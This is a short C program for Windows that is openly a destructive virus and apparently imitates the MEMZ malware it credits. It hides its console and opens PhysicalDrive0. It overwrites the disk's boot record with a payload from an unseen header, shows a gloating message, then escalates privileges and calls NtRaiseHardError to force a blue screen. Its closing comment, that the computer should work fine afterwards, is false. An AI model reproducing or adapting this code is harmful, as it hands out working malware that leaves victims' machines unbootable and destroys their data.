#include <windows.h>
#include "exported.h"
int main()
{
	FreeConsole(); //Hide the console.
	DWORD dw; //A tmp DW.
	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	//Now we have a handle to our dear MBR.
	//We're going now to overwrite it...
	//Write the mbrData data into hDrive.
	WriteFile(hDrive, mbrData, sizeof(mbrData), &dw, NULL);
	//DONE!
	//Now let's close the handle...
	CloseHandle(hDrive);
	//Do some payloads...
	//Show a message box.
	MessageBox(NULL, "Your MBR has been overwritten!!!", "NOTIFY", MB_OK | MB_ICONERROR);
	//If the user clicks OK, cause BSOD.
	//Thanks to Leurak for his awesome virus, MEMZ!
	HMODULE ntdll = LoadLibraryA("ntdll"); //Load NTDLL library.
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege"); //Some variables & stuff...
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2); //Now cause BSOD.
	}
	//The computer should work fine after BSOD xD
	return 0;
}
